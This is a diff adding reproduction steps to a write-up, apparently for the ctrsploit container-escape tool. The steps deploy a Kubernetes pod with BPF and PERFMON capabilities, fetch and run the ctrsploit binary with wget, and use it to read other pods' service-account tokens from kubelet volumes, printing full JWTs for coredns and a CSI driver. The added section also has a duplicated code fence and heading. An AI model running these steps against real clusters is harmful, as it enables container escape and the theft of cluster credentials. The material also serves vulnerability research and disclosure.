@@ -99,6 +99,8 @@ LOGO=ubuntu-logo
 
 ### 5.2 Reproduce Steps
 
+#### 5.2.1 CAP_SYS_ADMIN
+
 ```shell
 $ cat <<EOF | kubectl --kubeconfig kubeconfig apply -f -
 apiVersion: v1
@@ -132,4 +134,43 @@ ctrsploit            100% |*****************************************************
 INFO[0000] Waiting for events..                         
 INFO[0000] pid: 439, fd=25, pathname: /var/lib/kubelet/pods/d6406cbb-5476-45a6-a906-a09fb94b702e/volumes/kubernetes.io~projected/kube-api-access-td5cf/..2025_10_09_13_29_37.260125830/token
 token: eyJhbGciOiJSUzI1NiIsImtpZCI6InR1dGsyVGxpOFoyQm1nSV9TaFRkaTFTbTZ3UlRkd2hLaDVzamsyTGphU28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzkxNTUyNTc3LCJpYXQiOjE3NjAwMTY1NzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiYzJlYWI4NGQtNGE5My00ZTFmLTgwODMtNzc3ZmI3ZWJiNTAwIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsIm5vZGUiOnsibmFtZSI6Imt1YmVybmV0ZXMtMS0zMy0xIiwidWlkIjoiOGJhNzhhZjAtMTU3Ni00OTc4LTkyNDEtZGY1MDhkZTFmNjQ1In0sInBvZCI6eyJuYW1lIjoiY29yZWRucy02NzRiOGJiZmNmLWYyazJmIiwidWlkIjoiZDY0MDZjYmItNTQ3Ni00NWE2LWE5MDYtYTA5ZmI5NGI3MDJlIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjb3JlZG5zIiwidWlkIjoiMWYxZmQ2Y2QtYWU2YS00MjNkLWI3ODMtZjVkZDc1YTMxYThkIn0sIndhcm5hZnRlciI6MTc2MDAyMDE4NH0sIm5iZiI6MTc2MDAxNjU3Nywic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmNvcmVkbnMifQ.VL6A_7OeuZY53OyVRTxIgsI80d5XHW1yBtlf3OCK_aWu6Ks5mdnL04iRephIfC9Oe1Ib5d7vNSpSdZeLCebil-8eH7Wgv4cCqf7agWkM1izd1alEmKctUzsA_xr8mGxhYYYIErFm8G_qplg-owkUgoWcqG_gfWv_Kcfx_CnYo
+```
+
+#### 5.2.1 CAP_BPF+CAP_PERFMON
+
+```shell
+```shell
+$ cat <<EOF | kubectl --kubeconfig kubeconfig apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: test-pod
+spec:
+  restartPolicy: Never
+  containers:
+    - name: test-container
+      image: busybox:latest
+      tty: true
+      command: ["sleep", "inf"]
+      securityContext:
+        capabilities:
+          add:
+            - "BPF"
+            - "PERFMON"
+EOF
+$ kubectl --kubeconfig=kubeconfig wait --for=condition=ready pod/test-pod --timeout=120s
+$ kubectl --kubeconfig=kubeconfig exec -ti test-pod -- ash
+/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
+Connecting to github.com (20.205.243.166:443)
+wget: note: TLS certificate validation not implemented
+Connecting to github.com (20.205.243.166:443)
+Connecting to release-assets.githubusercontent.com (185.199.109.133:443)
+saving to '/usr/bin/ctrsploit'
+ctrsploit            100% |*********************************************************************************************************************************************************************| 17.9M  0:00:00 ETA
+'/usr/bin/ctrsploit' saved
+/ # chmod +x /usr/bin/ctrsploit
+/ # ctrsploit vul caps sys_admin x ebpf kubelet
+INFO[0000] Waiting for events..                         
+INFO[0007] pid: 466, fd=25, pathname: /var/lib/kubelet/pods/17496751-310a-4ed9-946c-720119f7e168/volumes/kubernetes.io~projected/kube-api-access-9b7kf/..2025_11_05_14_05_28.3705845087/token
+token: eyJhbGciOiJSUzI1NiIsImtpZCI6InR1dGsyVGxpOFoyQm1nSV9TaFRkaTFTbTZ3UlRkd2hLaDVzamsyTGphU28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzkzODg3NTI4LCJpYXQiOjE3NjIzNTE1MjgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNWE3NTYzNDUtODBlZS00NDMwLWE1YTItNmMxM2FlYzE3Y2EwIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjYWxpY28tc3lzdGVtIiwibm9kZSI6eyJuYW1lIjoia3ViZXJuZXRlcy0xLTMzLTEiLCJ1aWQiOiI4YmE3OGFmMC0xNTc2LTQ5NzgtOTI0MS1kZjUwOGRlMWY2NDUifSwicG9kIjp7Im5hbWUiOiJjc2ktbm9kZS1kcml2ZXItdmo2bjkiLCJ1aWQiOiIxNzQ5Njc1MS0zMTBhLTRlZDktOTQ2Yy03MjAxMTlmN2UxNjgifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImNzaS1ub2RlLWRyaXZlciIsInVpZCI6IjliMDQ2M2MzLWJkZmMtNGZkMC1iYzQzLTdiMTg5NWVkMWUwZCJ9LCJ3YXJuYWZ0ZXIiOjE3NjIzNTUxMzV9LCJuYmYiOjE3NjIzNTE1MjgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjYWxpY28tc3lzdGVtOmNzaS1ub2RlLWRyaXZlciJ9.PFDRXca7c5uH_IICyWuqvvjXTaFqySG4mhFjv0AkntXsiscrEJuO40eI-jpLpGPT-BxRQErF9B5N0y4t7jyCkcmH6IhUFlfESDLt6Xr2itxcqDEgPC_yPqw9osmnSe6x7OP9Ii9y1a9ex2jKuuP
 ```
